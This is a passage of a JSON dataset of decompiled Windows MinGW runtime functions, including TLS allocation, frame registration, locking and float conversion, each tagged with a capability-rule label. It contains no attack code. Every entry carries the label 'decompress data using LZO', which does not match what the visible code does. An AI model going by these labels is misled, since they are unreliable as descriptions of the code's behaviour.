(*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar3 == 0) {\n        *0x4ae004 = 0x41ca80;\n        pcVar2 = 0x41c830;\n    }\n    else {\n        *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"__register_frame_info\");\n        *0x4ae004 = (*pcVar1)(iVar3, \"__deregister_frame_info\");\n    }\n    if (pcVar2 != NULL) {\n        (*pcVar2)(0x50c0f8, 0x54901c);\n    }\n    fcn.004014c0(fcn.00401590);\n    return;\n}\n",
        "token_count": 1164
    },
    "0041ab00": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ab00(uint param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t in_EAX;\n    uint *puVar4;\n    \n    fcn.0041a630();\n    iVar2 = *(param_2 + 0xb4);\n    if (*(param_2 + 4 + iVar2 * 8) == 6) {\n        *(in_EAX + 0x4c) = 0;\n        return;\n    }\n    if (iVar2 < 0x12) {\n        puVar4 = *(in_EAX + iVar2 * 4);\n        if (((*(in_EAX + 99) & 0x40) == 0) || (*(in_EAX + 0x6c + iVar2) == '\\0')) {\n            if (*(iVar2 + 0x5493f4) != '\\x04') goto code_r0x004a69c5;\n            puVar4 = *puVar4;\n        }\n        *(in_EAX + 0x4c) = puVar4;\n        return;\n    }\ncode_r0x004a69c5:\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar2 == 0) {\n        *0x4ae004 = 0x41ca80;\n        pcVar3 = 0x41c830;\n    }\n    else {\n        *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"__register_frame_info\");\n        *0x4ae004 = (*pcVar1)(iVar2, \"__deregister_frame_info\");\n    }\n    if (pcVar3 != NULL) {\n        (*pcVar3)(0x50c0f8, 0x54901c);\n    }\n    fcn.004014c0(fcn.00401590);\n    return;\n}\n",
        "token_count": 570
    },
    "0041be50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041be50(uint param_1, uint32_t param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t *puVar4;\n    uint8_t uVar5;\n    uint32_t *in_EAX;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint extraout_ECX;\n    uint32_t uVar10;\n    uint *puVar11;\n    int32_t *piVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    int32_t iVar15;\n    uint32_t uVar16;\n    bool bVar17;\n    ulong uVar18;\n    uint in_stack_ffffffa8;\n    code *pcStack76;\n    uint32_t uStack68;\n    uint32_t uStack64;\n    uint32_t uStack60;\n    uint32_t uStack40;\n    uint32_t *puStack36;\n    int32_t iStack32;\n    \n    uVar5 = *(in_EAX + 4);\n    if ((uVar5 & 1) != 0) goto code_r0x0041be65;\n    uStack60 = in_EAX[4] >> 0xb;\n    if (uStack60 == 0) {\n        piVar12 = in_EAX[3];\n        if ((uVar5 & 2) == 0) {\n            uStack60 = fcn.0041ba40();\n            if (uStack60 != 0xffffffff) goto code_r0x0041c036;\ncode_r0x0041bf2b:\n            in_EAX[4] = 0x7f8;\n            in_EAX[3] = 0x505acc;\n        }\n        else if (*piVar12 != 0) {\n            do {\n                iVar6 = fcn.0041ba40();\n                if (iVar6 == -1) goto code_r0x0041bf2b;\n                piVar12 = piVar12 + 1;\n                uStack60 = uStack60 + iVar6;\n            } while (*piVar12 != 0);\ncode_r0x0041c036:\n            if ((uStack60 & 0xffe00000) == 0) {\n                in_EAX[4] = in_EAX[4] & 0x7ff | uStack60 << 0xb;\n            }\n            else {\n                in_EAX[4] = in_EAX[4] & 0x7ff;\n            }\n            if (uStack60 != 0) goto code_r0x0041c160;\n        }\n    }\n    else {\ncode_r0x0041c160:\n        iVar6 = uStack60 * 4 + 8;\n        puStack36 = sub.msvcrt.dll_malloc(iVar6);\n        if (puStack36 != NULL) {\n            puStack36[1] = 0;\n            iStack32 = sub.msvcrt.dll_malloc(iVar6);\n            if (iStack32 != 0) {\n                *(iStack32 + 4) = 0;\n            }\n            piVar12 = in_EAX[3];\n            if ((*(in_EAX + 4) & 2) == 0) {\n                fcn.0041bb90();\ncode_r0x0041c1d2:\n                iVar6 = iStack32;\n                puVar4 = puStack36;\n                if ((puStack36 == NULL) || (puStack36[1] == uStack60)) {\n                    pcStack76 = fcn.0041bdd0;\n                    if (((*(in_EAX + 4) & 4) == 0) && (pcStack76 = 0x41b8e0,  (*(in_EAX + 4) & 0x7f8) == 0)) {\n                        pcStack76 = 0x41b550;\n                    }\n                    if (iStack32 == 0) {\n                        fcn.0041b630();\n                    }\n                    else {\n                        uVar16 = puStack36[1];\n                        if (uVar16 == 0) {\n                            iVar13 = 0;\n                            uVar9 = 0;\n                        }\n                        else {\n                            iVar13 = 0x549408;\n                            puVar1 = puStack36 + 2;\n                            iVar15 = 8;\n                            while( true ) {\n                                *(iVar6 + iVar15) = iVar13;\n                                iVar13 = puVar4 + iVar15;\n                                if (uVar16 * 4 + 4 == iVar15) break;\n                                while (iVar13 != 0x549408) {\n                                    in_stack_ffffffa8 = *(puVar4 + iVar15 + 4);\n                                    iVar7 = (*pcStack76)();\n                                    if (-1 < iVar7) goto code_r0x0041c2af;\n                                    iVar7 = iVar6 + (iVar13 - puVar1);\n                                    iVar13 = *(iVar7 + 8);\n                                    *(iVar7 + 8) = 0;\n                                }\n                                iVar13 = 0x549408;\ncode_r0x0041c2af:\n                                iVar15 = iVar15 + 4;\n                            }\n                            iVar13 = 0;\n                            uVar9 = 0;\n                            uVar14 = 0;\n                            do {\n                                if (*(iVar6 + 8 + uVar14 * 4) == 0) {\n                                    *(iVar6 + 8 + iVar13 * 4) = puVar4[uVar14 + 2];\n                                    iVar13 = iVar13 + 1;\n                                }\n                                else {\n                                    puVar4[uVar9 + 2] = puVar4[uVar14 + 2];\n                                    uVar9 = uVar9 + 1;\n                                }\n                                uVar14 = uVar14 + 1;\n                            } while (uVar16 != uVar14);\n                        }\n                        puVar4[1] = uVar9;\n                        *(iVar6 + 4) = iVar13;\n                        if (*(iStack32 + 4) + puStack36[1] != uStack60) goto code_r0x0041c4c5;\n                        fcn.0041b630();\n                        iVar6 = iStack32;\n                        puVar4 = puStack36;\n                        uStack60 = *(iStack32 + 4);\n                        if (uStack60 != 0) {\n                            uVar16 = puStack36[1];\n                            do {\n                                iVar13 = uStack60 + -1;\n                                puVar1 = iVar6 + uStack60 * 4;\n                                uStack68 = puVar1[1];\n                                if (uVar16 == 0) {\n                                    puVar4[uStack60 + 1] = uStack68;\n                                    if (uStack60 == 1) break;\n                                    uStack68 = *puVar1;\n                                    iVar15 = uStack60 + -2;\n                                    uStack60 = uStack60 + -2;\n                                }\n                                else {\n                                    iVar7 = uStack60 + -1 + uVar16;\n                                    do {\n                                        uVar9 = uVar16 - 1;\n                                        iVar8 = (*pcStack76)(in_EAX, puVar4[uVar16 + 1], uStack68);\n                                        iVar15 = iVar7;\n                                        uStack60 = iVar13;\n                                        if (iVar8 < 1) break;\n                                        puVar4[iVar7 + 2] = puVar4[uVar16 + 1];\n                                        iVar7 = iVar7 + -1;\n                                        iVar15 = iVar13;\n                                        uVar16 = uVar9;\n                                    } while (uVar9 != 0);\n                                }\n                                puVar4[iVar15 + 2] = uStack68;\n                            } while (uStack60 != 0);\n                            puVar4[1] = puVar4[1] + *(iVar6 + 4);\n                        }\n                        fcn.00427908(iStack32);\n                    }\n                    *puStack36 = in_EAX[3];\n                    in_EAX[3] = puStack36;\n                    *(in_EAX + 4) = *(in_EAX + 4) | 1;\n                    goto code_r0x0041c057;\n                }\n            }\n            else if (*piVar12 != 0) {\n                do {\n                    piVar12 = piVar12 + 1;\n                    fcn.0041bb90();\n                } while (*piVar12 != 0);\n                goto code_r0x0041c1d2;\n            }\ncode_r0x0041c4c5:\n            uVar18 = sub.msvcrt.dll_abort();\n            puVar11 = uVar18 >> 0x20;\n            *puVar11 = 0xffffffff;\n            puVar11[1] = extraout_ECX;\n            puVar11[3] = uVar18;\n            iVar6 = *0x4f59f4;\n            puVar11[2] = in_stack_ffffffa8;\n            puVar11[4] = 0x7f8;\n            pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n            if (iVar6 == 0) {\ncode_r0x0041c596:\n                iVar6 = *0x549418;\n                puVar11[5] = *0x549418;\n                *0x549418 = puVar11;\n            }\n            else {\n                if (*0x4f5a00 == 0) {\n                    LOCK();\n                    *0x4f5a04 = *0x4f5a04 + 1;\n                    if (*0x4f5a04 == 0) {\n                        fcn.0041b6d0();\n                        *0x4f5a00 = 1;\n                    }\n                    else {\n                        do {\n                            (*pcVar3)(0);\n                        } while (*0x4f5a00 == 0);\n                    }\n                    if (*0x4f59f4 == 0) goto code_r0x0041c596;\n                }\n                LOCK();\n                iVar6 = *0x54940c + 1;\n                bVar17 = *0x54940c != -1;\n                *0x54940c = iVar6;\n                if ((bVar17) &&\n                   (iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x549410, 0xffffffff),  iVar6 != 0)) {\n                    LOCK();\n                    *0x54940c = *0x54940c + -1;\n                }\n                iVar6 = *0x549418;\n                iVar13 = *0x4f59f4;\n                puVar11[5] = *0x549418;\n                *0x549418 = puVar11;\n                if (iVar13 != 0) {\n                    LOCK();\n                    iVar13 = *0x54940c + -1;\n                    iVar6 = *0x54940c + -1;\n                    *0x54940c = iVar13;\n                    if (-1 < iVar6) {\n                        iVar6 = (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x549410, 1, 0);\n                    }\n                }\n            }\n            return iVar6;\n        }\n    }\ncode_r0x0041c057:\n    if (param_2 <= *in_EAX && *in_EAX != param_2) {\n        return 0;\n    }\n    uVar5 = *(in_EAX + 4);\n    piVar12 = in_EAX[3];\n    if ((uVar5 & 1) == 0) {\n        if ((uVar5 & 2) == 0) {\n            iVar6 = fcn.0041bca0();\n            return iVar6;\n        }\n        iVar6 = *piVar12;\n        while( true ) {\n            if (iVar6 == 0) {\n                return 0;\n            }\n            iVar6 = fcn.0041bca0();\n            if (iVar6 != 0) break;\n            piVar12 = piVar12 + 1;\n            iVar6 = *piVar12;\n        }\n        return iVar6;\n    }\ncode_r0x0041be65:\n    uVar16 = in_EAX[3];\n    uStack68 = *(uVar16 + 4);\n    if ((uVar5 & 4) == 0) {\n        uVar9 = 0;\n        if ((*(in_EAX + 4) & 0x7f8) == 0) {\n            while (uVar9 < uStack68) {\n                uVar10 = uVar9 + uStack68 >> 1;\n                iVar6 = *(uVar16 + 8 + uVar10 * 4);\n                iVar13 = *(iVar6 + 0xc);\n                uVar14 = *(iVar6 + 8);\n                while (uVar2 = uVar10,  param_2 < uVar14) {\n                    if (uVar2 <= uVar9) {\n                        return 0;\n                    }\n                    uVar10 = uVar2 + uVar9 >> 1;\n                    iVar6 = *(uVar16 + 8 + uVar10 * 4);\n                    iVar13 = *(iVar6 + 0xc);\n                    uStack68 = uVar2;\n                    uVar14 = *(iVar6 + 8);\n                }\n                if (param_2 < uVar14 + iVar13) {\n                    return iVar6;\n                }\n                uVar9 = uVar2 + 1;\n            }\n        }\n        else {\n            fcn.0041b760();\n            if (uStack68 != 0) {\n                uVar9 = 0;\n                do {\n                    uVar14 = uStack68 + uVar9 >> 1;\n                    iVar6 = *(uVar16 + 8 + uVar14 * 4);\n                    fcn.0041b7a0(&uStack40);\n                    fcn.0041b7a0(&puStack36);\n                    if (uStack40 <= param_2) {\n                        if (param_2 < uStack40 + puStack36) {\n                            return iVar6;\n                        }\n                        uVar9 = uVar14 + 1;\n                        uVar14 = uStack68;\n                    }\n                    uStack68 = uVar14;\n                } while (uVar9 < uVar14);\n            }\n        }\n    }\n    else if (uStack68 != 0) {\n        uStack64 = 0;\n        do {\n            uVar9 = uStack68 + uStack64 >> 1;\n            iVar6 = *(uVar16 + 8 + uVar9 * 4);\n            fcn.0041b950();\n            fcn.0041b760();\n            fcn.0041b7a0(&uStack40);\n            fcn.0041b7a0(&puStack36);\n            if (uStack40 <= param_2) {\n                if (param_2 < uStack40 + puStack36) {\n                    return iVar6;\n                }\n                uStack64 = uVar9 + 1;\n                uVar9 = uStack68;\n            }\n            uStack68 = uVar9;\n        } while (uStack64 < uStack68);\n    }\n    return 0;\n}\n",
        "token_count": 3327
    },
    "0041cad0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t fcn.0041cad0(uint32_t param_1, uint32_t *param_2)\n\n{\n    uint32_t **ppuVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t *puVar7;\n    uint32_t auStack32 [4];\n    \n    pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n    if (*0x4f59f4 != 0) {\n        if (*0x4f5a00 == 0) {\n            LOCK();\n            *0x4f5a04 = *0x4f5a04 + 1;\n            if (*0x4f5a04 == 0) {\n                fcn.0041b6d0();\n                *0x4f5a00 = 1;\n            }\n            else {\n                do {\n                    (*pcVar3)(0);\n                } while (*0x4f5a00 == 0);\n            }\n            if (*0x4f59f4 == 0) goto code_r0x0041cb03;\n        }\n        LOCK();\n        *0x54940c = *0x54940c + 1;\n        if ((*0x54940c != 0) &&\n           (iVar5 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x549410, 0xffffffff),  iVar5 != 0)) {\n            LOCK();\n            *0x54940c = *0x54940c + -1;\n        }\n    }\ncode_r0x0041cb03:\n    if (*0x549414 == NULL) goto code_r0x0041cb30;\n    puVar7 = *0x549414;\n    if (param_1 < **0x549414) {\n        do {\n            puVar7 = puVar7[5];\n            if (puVar7 == NULL) goto code_r0x0041cb30;\n        } while (param_1 <= *puVar7 && *puVar7 != param_1);\n    }\n    iVar5 = fcn.0041be50();\n    iVar6 = *0x54940c;\n    do {\n        while( true ) {\n            *0x54940c = iVar6;\n            if (iVar5 != 0) {\n                if (*0x4f59f4 != 0) {\n                    LOCK();\n                    *0x54940c = iVar6 + -1;\n                    if (-1 < iVar6 + -1) {\n                        (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x549410, 1, 0);\n                    }\n                }\n                *param_2 = puVar7[1];\n                param_2[1] = puVar7[2];\n                if ((*(puVar7 + 4) & 4) != 0) {\n                    fcn.0041b950();\n                }\n                fcn.0041b760();\n                fcn.0041b7a0(auStack32);\n                param_2[2] = auStack32[0];\n                return iVar5;\n            }\ncode_r0x0041cb30:\n            puVar7 = *0x549418;\n            if (*0x549418 == NULL) {\n                if (*0x4f59f4 != 0) {\n                    LOCK();\n                    iVar5 = *0x54940c + -1;\n                    iVar6 = *0x54940c + -1;\n                    *0x54940c = iVar5;\n                    if (-1 < iVar6) {\n                        (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x549410, 1, 0);\n                    }\n                }\n                return 0;\n            }\n            *0x549418 = (*0x549418)[5];\n            iVar5 = fcn.0041be50();\n            if ((*0x549414 != NULL) &&\n               (uVar2 = *puVar7,  puVar4 = *0x549414,  uVar2 < **0x549414 || uVar2 == **0x549414)) break;\n            puVar7[5] = *0x549414;\n            iVar6 = *0x54940c;\n            *0x549414 = puVar7;\n        }\n        do {\n            ppuVar1 = puVar4 + 5;\n            puVar4 = puVar4[5];\n            if (puVar4 == NULL) break;\n        } while (uVar2 <= *puVar4);\n        puVar7[5] = puVar4;\n        *ppuVar1 = puVar7;\n        iVar6 = *0x54940c;\n    } while( true );\n}\n",
        "token_count": 1048
    },
    "0041cea0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0041cea0(int32_t param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    if (*0x4f59f4 == 0) {\n        if (*(param_1 + 8) != 0) {\n            return;\n        }\n        uVar6 = fcn.0041cd80();\n        *(param_1 + 8) = uVar6;\n        return;\n    }\n    uVar10 = *(param_1 + 8);\n    if (uVar10 == 0) {\n        if (*0x4f59f4 == 0) {\ncode_r0x0041d078:\n            uVar10 = *(param_1 + 8);\n            if (uVar10 == 0) goto code_r0x0041d087;\n        }\n        else {\n            if (*0x4f5a08 == 0) {\n                LOCK();\n                *0x4f5a0c = *0x4f5a0c + 1;\n                if (*0x4f5a0c == 0) {\n                    fcn.0041ce20();\n                    *0x4f5a08 = 1;\n                }\n                else {\n                    do {\n                        (*pcVar2)(0);\n                    } while (*0x4f5a08 == 0);\n                }\n                if (*0x4f59f4 == 0) goto code_r0x0041d078;\n            }\n            LOCK();\n            *0x549424 = *0x549424 + 1;\n            if ((*0x549424 != 0) &&\n               (iVar8 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x549428, 0xffffffff),  iVar8 != 0)) {\n                LOCK();\n                *0x549424 = *0x549424 + -1;\n            }\n            uVar10 = *(param_1 + 8);\n            if (uVar10 == 0) {\ncode_r0x0041d087:\n                uVar10 = *0x54941c + 1;\n                *0x54941c = uVar10;\n                *(param_1 + 8) = uVar10;\n            }\n            if (*0x4f59f4 != 0) {\n                LOCK();\n                iVar8 = *0x549424 + -1;\n                iVar7 = *0x549424 + -1;\n                *0x549424 = iVar8;\n                if (-1 < iVar7) {\n                    (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x549428, 1, 0);\n                }\n            }\n        }\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    uVar6 = *0x549420;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    puVar4 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(uVar6);\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar3);\n    if (puVar4 == NULL) {\n        puVar4 = sub.msvcrt.dll_calloc(uVar10 + 0x21, 4);\n        if (puVar4 == NULL) {\ncode_r0x004014e0:\n            sub.msvcrt.dll_abort();\n            iVar8 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n            if (iVar8 == 0) {\n                *0x4ae004 = 0x41ca80;\n                pcVar2 = 0x41c830;\n            }\n            else {\n                *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n                pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar8, \"__register_frame_info\");\n                *0x4ae004 = (*pcVar1)(iVar8, \"__deregister_frame_info\");\n            }\n            if (pcVar2 != NULL) {\n                (*pcVar2)(0x50c0f8, 0x54901c);\n            }\n            fcn.004014c0(fcn.00401590);\n            return;\n        }\n        *puVar4 = uVar10 + 0x20;\n    }\n    else {\n        uVar5 = *puVar4;\n        if (uVar10 <= uVar5) goto code_r0x0041cf07;\n        uVar9 = uVar5 * 2;\n        if (uVar5 * 2 < uVar10) {\n            uVar9 = uVar10 + 0x20;\n        }\n        puVar4 = sub.msvcrt.dll_realloc(puVar4, uVar9 * 4 + 4);\n        if (puVar4 == NULL) goto code_r0x004014e0;\n        *puVar4 = uVar9;\n        sub.msvcrt.dll_memset(puVar4 + uVar5 + 1, 0, (uVar9 - uVar5) * 4);\n    }\n    iVar8 = (*_sym.imp.KERNEL32.dll_TlsSetValue)(*0x549420, puVar4);\n    if (iVar8 == 0) {\n        (*pcVar2)();\n    }\ncode_r0x0041cf07:\n    if (puVar4[uVar10] == 0) {\n        uVar5 = fcn.0041cd80();\n        puVar4[uVar10] = uVar5;\n    }\n    return;\n}\n",
        "token_count": 1297
    },
    "00420eb0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00420eb0(int16_t *param_1, int16_t *param_2)\n\n{\n    uint16_t uVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    \n    *param_2 = param_1[5] >> 0xf;\n    uVar1 = param_1[5];\n    param_2[1] = uVar1 & 0x7fff;\n    if ((uVar1 & 0x7fff) != 0x7fff) {\n        param_2[2] = 0;\n        piVar3 = param_1 + 4;\n        piVar4 = param_2 + 3;\n        do {\n            piVar2 = piVar3 + -1;\n            *piVar4 = *piVar3;\n            piVar3 = piVar2;\n            piVar4 = piVar4 + 1;\n        } while (piVar2 != param_1 + -1);\n        param_2[8] = 0;\n        return;\n    }\n    if ((param_1[5] & 0x7fffU) == 0x7fff) {\n        piVar3 = param_1;\n        do {\n            piVar4 = piVar3 + 1;\n            if (*piVar3 != 0) {\n                param_2[2] = 0;\n                piVar3 = param_1 + 4;\n                piVar4 = param_2 + 3;\n                do {\n                    piVar2 = piVar3 + -1;\n                    *piVar4 = *piVar3;\n                    piVar3 = piVar2;\n                    piVar4 = piVar4 + 1;\n                } while (piVar2 != param_1 + -2);\n                return;\n            }\n            piVar3 = piVar4;\n        } while (piVar4 != param_1 + 5);\n    }\n    piVar3 = param_2 + 2;\n    do {\n        piVar4 = piVar3 + 1;\n        *piVar3 = 0;\n        piVar3 = piVar4;\n    } while (piVar4 != param_2 + 9);\n    return;\n}\n",
        "token_count": 494
    },
    "004215d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004215d0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint16_t *puVar2;\n    uint32_t uVar3;\n    uint16_t uVar4;\n    uint32_t uVar5;\n    uint16_t *puVar6;\n    uint16_t uVar7;\n    \n    uVar7 = *(param_1 + 4);\n    uVar5 = uVar7;\n    if (uVar7 == 0) {\n        uVar7 = *(param_1 + 6);\n        iVar1 = 0;\n        if (-1 < uVar7) {\n            while (uVar7 == 0) {\n                puVar2 = param_1 + 6;\n                while( true ) {\n                    puVar6 = puVar2 + 1;\n                    puVar2[-1] = uVar7;\n                    if (puVar6 == param_1 + 0x12) break;\n                    uVar7 = *puVar6;\n                    puVar2 = puVar6;\n                }\n                iVar1 = iVar1 + 0x10;\n                *(param_1 + 0x10) = 0;\n                if (iVar1 == 0x60) {\n                    return;\n                }\n                uVar7 = *(param_1 + 6);\n            }\n            if ((uVar7 & 0xff00) == 0) {\n                do {\n                    uVar7 = 0;\n                    puVar2 = param_1 + 0x10;\n                    do {\n                        uVar4 = *puVar2;\n                        puVar6 = puVar2 + -1;\n                        *puVar2 = uVar4 << 8 | uVar7;\n                        uVar7 = uVar4 >> 8;\n                        puVar2 = puVar6;\n                    } while (puVar6 != param_1 + 2);\n                    uVar7 = *(param_1 + 6);\n                    iVar1 = iVar1 + 8;\n                } while ((uVar7 & 0xff00) == 0);\n            }\n            while (-1 < uVar7) {\n                uVar7 = 0;\n                puVar2 = param_1 + 0x10;\n                do {\n                    if (*puVar2 < 0) {\n                        uVar7 = uVar7 | 1;\n                    }\n                    uVar4 = *puVar2 * 2;\n                    if ((uVar7 & 2) != 0) {\n                        uVar4 = uVar4 | 1;\n                    }\n                    puVar6 = puVar2 + -1;\n                    uVar7 = uVar7 * 2;\n                    *puVar2 = uVar4;\n                    puVar2 = puVar6;\n                } while (param_1 + 2 != puVar6);\n                iVar1 = iVar1 + 1;\n                if (0x60 < iVar1) {\n                    return;\n                }\n                uVar7 = *(param_1 + 6);\n            }\n        }\n    }\n    else {\n        iVar1 = 0;\n        if ((uVar7 & 0xff00) != 0) {\n            iVar1 = 0;\n            puVar2 = param_1 + 4;\n            while( true ) {\n                puVar6 = puVar2 + 1;\n                uVar7 = iVar1;\n                iVar1 = uVar5 << 8;\n                *puVar2 = uVar5 >> 8 | uVar7;\n                if (puVar6 == param_1 + 0x12) break;\n                uVar5 = *puVar6;\n                puVar2 = puVar6;\n            }\n            uVar5 = *(param_1 + 4);\n            iVar1 = -8;\n        }\n        while (uVar5 != 0) {\n            uVar3 = 0;\n            puVar2 = param_1 + 4;\n            while( true ) {\n                if ((uVar5 & 1) != 0) {\n                    uVar3 = uVar3 | 1;\n                }\n                uVar7 = uVar5 >> 1;\n                if ((uVar3 & 2) != 0) {\n                    uVar7 = uVar7 | 0x8000;\n                }\n                puVar6 = puVar2 + 1;\n                uVar3 = uVar3 * 2;\n                *puVar2 = uVar7;\n                if (param_1 + 0x12 == puVar6) break;\n                uVar5 = *puVar6;\n                puVar2 = puVar6;\n            }\n            iVar1 = iVar1 + -1;\n            if (iVar1 == -0x51) {\n                return;\n            }\n            uVar5 = *(param_1 + 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 1048
    },
    "00424170": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00424170(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    bool bVar3;\n    \n    piVar2 = param_1 + -1;\n    *param_1 = param_1[-1];\n    param_1[1] = 1 << (param_1[-1] & 0x1f);\n    if (piVar2 != NULL) {\n        if (9 < *param_1) {\n    // WARNING: Could not recover jumptable at 0x00427908. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)();\n            return;\n        }\n        fcn.004268a0();\n        bVar3 = *0x549d88 == 2;\n        iVar1 = *(*param_1 * 4 + 0x549d60);\n        *(*param_1 * 4 + 0x549d60) = piVar2;\n        *piVar2 = iVar1;\n        if (bVar3) {\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x549da0);\n        }\n    }\n    return;\n}\n",
        "token_count": 267
    },
    "00426a80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00426a80(uint *param_1)\n\n{\n    uint uVar1;\n    bool bVar2;\n    \n    if (param_1 != NULL) {\n        if (9 < param_1[1]) {\n    // WARNING: Could not recover jumptable at 0x00427908. Too many branches\n    // WARNING: Treating indirect jump as call\n            (*_sym.imp.msvcrt.dll_free)();\n            return;\n        }\n        fcn.004268a0();\n        bVar2 = *0x549d88 == 2;\n        uVar1 = *(param_1[1] * 4 + 0x549d60);\n        *(param_1[1] * 4 + 0x549d60) = param_1;\n        *param_1 = uVar1;\n        if (bVar2) {\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x549da0);\n        }\n    }\n    return;\n}\n",
        "token_count": 216
    },
    "004243a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar * fcn.004243a0(int32_t *param_1, int32_t param_2, uint32_t *param_3, uint32_t *param_4, uint32_t param_5, \n                   uint32_t param_6, int32_t *param_7, char **param_8)\n\n{\n    uint32_t *puVar1;\n    double dVar2;\n    double dVar3;\n    double dVar4;\n    bool bVar5;\n    double dVar6;\n    bool bVar7;\n    bool bVar8;\n    bool bVar9;\n    char cVar10;\n    uint32_t *puVar11;\n    char *pcVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    uint32_t uVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    uint32_t uVar21;\n    char *pcVar22;\n    uint32_t *puVar23;\n    uint32_t *puVar24;\n    int32_t iVar25;\n    uint32_t uVar26;\n    char *pcVar27;\n    char *pcVar28;\n    float10 fVar29;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint32_t uStack124;\n    uint32_t uStack120;\n    uint32_t uStack116;\n    int32_t iStack112;\n    uint32_t uStack108;\n    char *pcStack104;\n    uint uStack100;\n    int32_t iStack96;\n    uint32_t uStack92;\n    int32_t iStack88;\n    uint32_t uStack76;\n    int32_t iStack68;\n    int32_t iStack64;\n    uint32_t uStack60;\n    uint32_t uStack52;\n    uint32_t auStack32 [4];\n    \n    uVar14 = *param_4;\n    *param_4 = uVar14 & 0xffffffcf;\n    // switch table (5 cases) at 0x506140\n    switch(uVar14 & 7) {\n    case 0:\n        goto code_r0x004244a8;\n    case 1:\n    case 2:\n        iVar20 = 0;\n        iVar15 = *param_1;\n        if (0x20 < iVar15) {\n            iVar16 = 0x20;\n            do {\n                iVar25 = iVar16 * 2;\n                iVar20 = iVar20 + 1;\n                iVar18 = iVar16 * -2;\n                iVar16 = iVar25;\n            } while (iVar15 != iVar25 && SBORROW4(iVar15, iVar25) == iVar15 + iVar18 < 0);\n        }\n        iVar20 = 